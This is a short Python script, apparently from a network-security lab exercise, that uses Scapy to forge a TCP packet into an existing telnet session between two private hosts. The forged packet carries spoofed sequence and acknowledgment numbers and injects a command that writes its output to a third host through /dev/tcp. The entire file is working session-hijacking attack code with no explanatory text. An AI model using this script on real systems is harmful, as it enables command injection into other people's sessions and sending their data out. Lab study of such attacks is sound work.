from scapy.all import *
ip = IP(src="10.0.2.4", dst="10.0.2.5")
tcp = TCP(sport=54698, dport=23, flags="A", seq=711641067, ack=976670843)
data = "\r pwd > /dev/tcp/10.0.2.15/9090 \r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)

